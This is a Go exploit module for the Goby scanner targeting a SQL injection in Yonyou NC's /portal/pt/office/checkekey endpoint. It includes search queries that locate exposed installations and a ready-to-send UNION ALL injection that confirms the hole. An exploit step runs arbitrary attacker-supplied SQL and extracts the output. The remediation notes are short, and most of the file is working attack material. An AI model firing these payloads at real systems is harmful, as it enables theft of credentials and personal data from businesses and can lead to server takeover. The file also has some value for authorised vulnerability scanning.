package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Yonyou NC /portal/pt/office/checkekey SQL Injection Vulnerability",
    "Description": "<p>Yonyou NC is an Enterprise Resource Planning (ERP) system designed to help enterprises improve operational efficiency, optimize resource utilization, and enhance management capabilities. This vulnerability exists in the /portal/pt/office/checkekey interface of the Yonyou NC system, allowing attackers to construct malicious SQL statements to obtain sensitive information from the database (such as administrator passwords and user personal information) and even write malicious code to the server under high privileges to further gain system control.</p>",
    "Product": "Yonyou NC",
    "Homepage": "http://www.yonyou.com",
    "DisclosureDate": "2025-01-08",
    "PostTime": "2025-01-13",
    "Author": "heqiming@baimaohui.net",
    "FofaQuery": "(body=\"UFIDA\" && body=\"logo/images/\") || (body=\"logo/images/ufida_nc.png\") || title=\"Yonyou NC\" || body=\"<div id=\\\"nc_text\\\">\" || body=\"<div id=\\\"nc_img\\\" onmouseover=\\\"overImage('nc');\" || (title==\"产品登录界面\" && body=\"UFIDA NC\") ",
    "GobyQuery": "(body=\"UFIDA\" && body=\"logo/images/\") || (body=\"logo/images/ufida_nc.png\") || title=\"Yonyou NC\" || body=\"<div id=\\\"nc_text\\\">\" || body=\"<div id=\\\"nc_img\\\" onmouseover=\\\"overImage('nc');\" || (title==\"产品登录界面\" && body=\"UFIDA NC\") ",
    "Level": "2",
    "Impact": "<p>This vulnerability allows attackers to obtain sensitive information from the database through SQL injection and even execute arbitrary code under high privileges, potentially leading to data leakage and complete system control.</p>",
    "Recommendation": "<p>1. Deploy a Web Application Firewall (WAF) to monitor database operations.2. If not necessary, prohibit public network access to the system.3. Upgrade the Yonyou NC system to the latest version and strictly filter and validate input parameters to prevent the execution of malicious SQL statements.4. Minimize database access permissions to ensure the security of sensitive data.</p>",
    "References": [
        "https://mp.weixin.qq.com/s/uj_JpVkjGnoSmGbdxKUllA?token=1670173867&lang=zh_CN"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "SELECT TABLE_NAME FROM USER_TABLES WHERE ROWNUM=1,SELECT USER FROM dual",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "SELECT TABLE_NAME FROM USER_TABLES WHERE ROWNUM=1",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/portal/pt/office/checkekey?pageId=login",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0"
                },
                "data_type": "text",
                "data": "user=1' UNION ALL SELECT NULL,CHR(65)||CHR(49)||CHR(66)||CHR(50)||CHR(67)||CHR(51)||CHR(68)||CHR(52)||CHR(69)||CHR(53)||CHR(70)||CHR(54)||CHR(71)||CHR(55)||CHR(72)||CHR(56)||CHR(73)||CHR(57)||CHR(74)||CHR(48)||CHR(75)||CHR(49)||CHR(76)||CHR(50)||CHR(77)||CHR(51)||CHR(78)||CHR(52)||CHR(79)||CHR(53)||CHR(80)||CHR(54)||CHR(81)||CHR(55)||CHR(82)||CHR(56)||CHR(83)||CHR(57)||CHR(84)||CHR(48)||CHR(85)||CHR(49)||CHR(86)||CHR(50)||CHR(87)||CHR(51)||CHR(88)||CHR(52)||CHR(89)||CHR(53)||CHR(90)||CHR(54)||CHR(65)||CHR(55)||CHR(66)||CHR(56)||CHR(67)||CHR(57)||CHR(68)||CHR(48)||CHR(69)||CHR(49)||CHR(70)||CHR(50)||CHR(71)||CHR(51)||CHR(72)||CHR(52)||CHR(73)||CHR(53)||CHR(74)||CHR(54)||CHR(75)||CHR(55)||CHR(76)||CHR(56)||CHR(77)||CHR(57)||CHR(78)||CHR(48)||CHR(79)||CHR(49)||CHR(80)||CHR(50),NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL-- twnX&ekey=1"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "A1B2C3D4E5F6G7H8I9J0K1L2M3N4O5P6Q7R8S9T0U1V2W3X4Y5Z6A7B8C9D0E1F2G3H4I5J6K7L8M9N0O1P2",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/portal/pt/office/checkekey?pageId=login",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0"
                },
                "data_type": "text",
                "data": "user=1' UNION ALL SELECT NULL,CHR(126)||CHR(126)||CHR(126)||({{{payload}}})||CHR(126)||CHR(126)||CHR(126),NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL-- twnX&ekey=1"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|~~~([^'][\\s\\S]*?)~~~",
                "output|when|attackType=sqlpoint|{{{lastreq}}}user=1*&ekey=1"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "用友NC /portal/pt/office/checkekey SQL 注入漏洞",
            "Product": "用友NC",
            "Description": "<p>用友NC是一套企业资源规划（ERP）系统，旨在帮助企业提高运营效率、优化资源利用和提升管理水平。该漏洞存在于用友NC系统的 /portal/pt/office/checkekey 接口中，攻击者可以通过构造恶意的SQL语句，获取数据库中的敏感信息（如管理员密码、用户个人信息），甚至在高权限情况下向服务器写入恶意代码，进一步获取系统权限。</p>",
            "Recommendation": "<p>1、部署Web应用防火墙，对数据库操作进行监控。2、如非必要，禁止公网访问该系统。3、升级用友NC系统至最新版本，并严格过滤和验证输入参数，防止恶意SQL语句的执行。4、最小化数据库访问权限，确保敏感数据的安全。</p>",
            "Impact": "<p>该漏洞允许攻击者通过SQL注入获取数据库中的敏感信息，甚至在高权限情况下执行任意代码，可能导致数据泄露、系统被完全控制等严重后果。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Yonyou NC /portal/pt/office/checkekey SQL Injection Vulnerability",
            "Product": "Yonyou NC",
            "Description": "<p>Yonyou NC is an Enterprise Resource Planning (ERP) system designed to help enterprises improve operational efficiency, optimize resource utilization, and enhance management capabilities. This vulnerability exists in the /portal/pt/office/checkekey interface of the Yonyou NC system, allowing attackers to construct malicious SQL statements to obtain sensitive information from the database (such as administrator passwords and user personal information) and even write malicious code to the server under high privileges to further gain system control.</p>",
            "Recommendation": "<p>1. Deploy a Web Application Firewall (WAF) to monitor database operations.2. If not necessary, prohibit public network access to the system.3. Upgrade the Yonyou NC system to the latest version and strictly filter and validate input parameters to prevent the execution of malicious SQL statements.4. Minimize database access permissions to ensure the security of sensitive data.</p>",
            "Impact": "<p>This vulnerability allows attackers to obtain sensitive information from the database through SQL injection and even execute arbitrary code under high privileges, potentially leading to data leakage and complete system control.</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "payload": "switch|attackType|{{{default}}}",
        "vulurl": "define|variable|{{{fixedhostinfo}}}/portal/pt/office/checkekey"
    },
    "VariablesOrder": [
        "payload",
        "vulurl"
    ],
    "EditType": "fast",
    "PocId": "9984"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
